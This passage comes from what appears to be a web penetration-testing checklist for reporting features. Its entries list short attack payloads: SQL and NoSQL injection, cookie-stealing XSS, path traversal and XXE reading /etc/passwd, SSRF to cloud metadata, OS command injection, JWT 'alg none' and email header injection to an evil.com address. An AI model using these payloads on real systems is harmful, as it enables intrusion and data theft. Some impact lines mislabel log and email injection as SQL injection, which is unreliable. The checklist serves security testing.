**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Hydra

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## RPT-178 — Share Download IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Download shared report 2. Modify report_id 3. Download unshared report 4. Data theft

**Expected Result:** Download should verify share access

**Payload Example:**

```
GET /api/shares/token/download?report_id=unshared
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-179 — Embedded Report IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Embed own report 2. Modify embed parameters 3. Embed others' report 4. Unauthorized embedding

**Expected Result:** Embedding should verify ownership

**Payload Example:**

```
<iframe src="/embed/victim_report_id">
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-180 — Share Analytics IDOR
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. View share analytics 2. Modify share_id 3. View others' share analytics 4. Information disclosure

**Expected Result:** Analytics should verify share ownership

**Payload Example:**

```
GET /api/shares/victim_share_id/analytics
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-181 — Drill-down SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Click to drill-down 2. Intercept drill-down request 3. Inject SQL in dimension 4. Data extraction

**Expected Result:** Drill-down queries should be parameterized

**Payload Example:**

```
dimension='; SELECT * FROM sensitive_data--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-182 — Drill-down IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill into own data 2. Modify dimension values 3. Access others' detailed data 4. Privacy breach

**Expected Result:** Drill-down should respect permissions

**Payload Example:**

```
drill_user_id=victim_id in drill-down request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-183 — Drill-down Depth Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill-down has depth limit 2. Bypass limit 3. Access granular data 4. Detailed information exposure

**Expected Result:** Drill-down depth should be enforced

**Payload Example:**

```
depth=10 when max is 3
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-184 — Drill-down Filter Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill-down with filter 2. Remove or modify filter 3. Access unfiltered data 4. Full data access

**Expected Result:** Filters should be maintained

**Payload Example:**

```
Remove mandatory filter from drill request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-185 — Drill-down XSS via Dimension
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Data contains XSS 2. Drill into that data 3. Dimension value displayed 4. XSS executes

**Expected Result:** Drill-down values should be sanitized

**Payload Example:**

```
Dimension value: <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-186 — Drill-down Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill-down uses file paths 2. Inject path traversal 3. Access system files 4. Information disclosure

**Expected Result:** Drill-down paths should be validated

**Payload Example:**

```
dimension=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## RPT-187 — Drill-down Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Export drill-down data 2. Modify export scope 3. Export unauthorized data 4. Data breach

**Expected Result:** Export should respect drill-down permissions

**Payload Example:**

```
Export data from unauthorized drill-down
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-188 — Drill-down Aggregation Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. View aggregated drill-down 2. Request individual records 3. Bypass aggregation 4. Access raw data

**Expected Result:** Raw data should require authorization

**Payload Example:**

```
GET /api/drilldown/raw?id=123
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-189 — Drill-down Date Range Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill with date range 2. Modify range 3. Access historical data 4. Unauthorized time access

**Expected Result:** Date ranges should be validated

**Payload Example:**

```
Access data outside allowed date range
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-190 — Drill-down DoS via Complexity
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Create complex drill-down 2. Many dimensions and filters 3. Query times out 4. DoS

**Expected Result:** Query complexity should be limited

**Payload Example:**

```
Drill-down with 50 dimensions
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-191 — Drill-down Segment Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill within segment 2. Modify segment parameter 3. Access restricted segment 4. Data breach

**Expected Result:** Segment restrictions should be enforced

**Payload Example:**

```
segment=internal_users without permission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-192 — Drill-down Cross-Tenant
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Drill-down

**Test Steps:** 1. Drill in own tenant 2. Modify tenant context 3. Drill into other tenant 4. Cross-tenant access

**Expected Result:** Drill-down should be tenant-scoped

**Payload Example:**

```
tenant_id=victim_tenant in drill request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-193 — Report API Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report API 2. Remove/modify auth token 3. Access without auth 4. Unauthorized access

**Expected Result:** All API endpoints should require authentication

**Payload Example:**

```
API call without Authorization header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## RPT-194 — Report API Authorization Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access own reports 2. Access others' reports 3. No authorization check 4. Data breach

**Expected Result:** Authorization should be checked per request

**Payload Example:**

```
Access any report without ownership check
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-195 — Report Data SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Query report data 2. Inject SQL in any parameter 3. Execute malicious query 4. Full database access

**Expected Result:** All queries should be parameterized

**Payload Example:**

```
Any parameter: '; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-196 — Report NoSQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Query with NoSQL filter 2. Inject NoSQL operators 3. Bypass filters 4. Access all data

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"$gt":"",user_id:{"$ne":null}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## RPT-197 — Report XSS via Any Input
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Submit XSS in any input field 2. Data stored or reflected 3. View output 4. XSS executes

**Expected Result:** All outputs should be encoded

**Payload Example:**

```
<script>alert(document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-198 — Report CSRF on State Changes
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Create malicious page 2. Trigger report modification 3. User visits 4. Report altered

**Expected Result:** All mutations should have CSRF protection

**Payload Example:**

```
CSRF for create/update/delete operations
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## RPT-199 — Report Mass Assignment
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Create/update report 2. Add extra parameters 3. Modify restricted fields 4. Privilege escalation

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"test",owner_id:"admin",is_public:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## RPT-200 — Report Sensitive Data Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. View report API responses 2. Find sensitive fields 3. Extract PII or secrets 4. Data breach

**Expected Result:** Only necessary data should be returned

**Payload Example:**

```
API response with user emails or internal IDs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-201 — Report Verbose Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Trigger report errors 2. Analyze error messages 3. Extract system info 4. Reconnaissance

**Expected Result:** Errors should be generic in production

**Payload Example:**

```
Stack traces or SQL errors in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-202 — Report Rate Limiting Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Hit rate limit 2. Bypass via headers 3. Continue requests 4. Data scraping

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For rotation or API key rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## RPT-203 — Report Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Request report file 2. Inject path traversal 3. Access system files 4. Information disclosure

**Expected Result:** File paths should be validated

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## RPT-204 — Report SSRF via Data Source
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Configure data source 2. Provide internal URL 3. Report fetches data 4. SSRF

**Expected Result:** Data source URLs should be validated

**Payload Example:**

```
data_source=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-205 — Report XXE via XML Data
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Upload XML data 2. Include XXE payload 3. XML parsed 4. File disclosure

**Expected Result:** XML parsing should disable entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## RPT-206 — Report Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Create report with template syntax 2. Report renders 3. Template executes 4. Code execution

**Expected Result:** Report templates should be sandboxed

**Payload Example:**

```
{{constructor.constructor('return this')()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## RPT-207 — Report Command Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report uses system commands 2. Inject OS command 3. Command executes 4. Server compromise

**Expected Result:** Commands should never use user input

**Payload Example:**

```
; cat /etc/passwd ; or | whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## RPT-208 — Report Clickjacking
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Frame report page 2. Create overlay 3. Trick user 4. Unauthorized action

**Expected Result:** Reports should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over report actions
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## RPT-209 — Report CORS Misconfiguration
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Send cross-origin request 2. Check CORS headers 3. Access data cross-origin 4. Data theft

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Origin: https://evil.com with credentials
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## RPT-210 — Report WebSocket Security
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Connect to report WebSocket 2. Access without auth 3. Receive real-time data 4. Unauthorized access

**Expected Result:** WebSocket should require authentication

**Payload Example:**

```
WS connection without auth token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-211 — Report GraphQL Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Query reports via GraphQL 2. Inject malicious query 3. Access unauthorized data 4. Over-fetching

**Expected Result:** GraphQL should enforce field-level security

**Payload Example:**

```
{ report { id sensitiveField hiddenData } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## RPT-212 — Report GraphQL DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Send complex GraphQL query 2. Deeply nested 3. Exhaust resources 4. DoS

**Expected Result:** Query depth and complexity should be limited

**Payload Example:**

```
{ report { nested { nested { nested ... } } } }
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-213 — Report Batch Processing Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Submit batch report request 2. Include many reports 3. Exhaust resources 4. DoS

**Expected Result:** Batch operations should be limited

**Payload Example:**

```
Batch request with 10000 reports
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-214 — Report Job Queue Manipulation
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Queue report job 2. Modify job priority 3. Jump queue 4. Resource abuse

**Expected Result:** Job priorities should be fixed

**Payload Example:**

```
{"priority":"critical"} as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-215 — Report Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Request cached report 2. Inject via headers 3. Poison cache 4. Serve malicious content

**Expected Result:** Cache should be user-specific or validated

**Payload Example:**

```
X-Forwarded-Host injection in report request
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## RPT-216 — Report Sensitive Parameter in URL
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report uses GET parameters 2. Sensitive data in URL 3. URL logged/cached 4. Data exposure

**Expected Result:** Sensitive data should use POST

**Payload Example:**

```
GET /report?api_key=secret&user_id=123
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser History

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-217 — Report Session Fixation
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Get session before auth 2. User authenticates 3. Use fixed session 4. Access reports

**Expected Result:** Session should regenerate on auth

**Payload Example:**

```
Fixed session_id accessing reports
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## RPT-218 — Report JWT Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Capture report JWT 2. Modify claims 3. Access as different user 4. Privilege escalation

**Expected Result:** JWT should be properly validated

**Payload Example:**

```
{"alg":"none"} or modify user_id claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## RPT-219 — Report Insecure Deserialization
**Test Category:** Insecure Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Find serialized report data 2. Modify serialized object 3. Deserialize 4. Code execution

**Expected Result:** Deserialization should be safe

**Payload Example:**

```
PHP/Java/Python serialized payload
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / phpggc / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## RPT-220 — Report Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Submit data logged 2. Inject log format 3. Forge log entries 4. Audit trail manipulation

**Expected Result:** Logs should sanitize user input

**Payload Example:**

```
input=valid\nFake admin action logged
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Log Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-221 — Report Email Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report sends email 2. Inject headers 3. Send spam 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
recipient=test@test.com%0ABcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-222 — Report Prototype Pollution
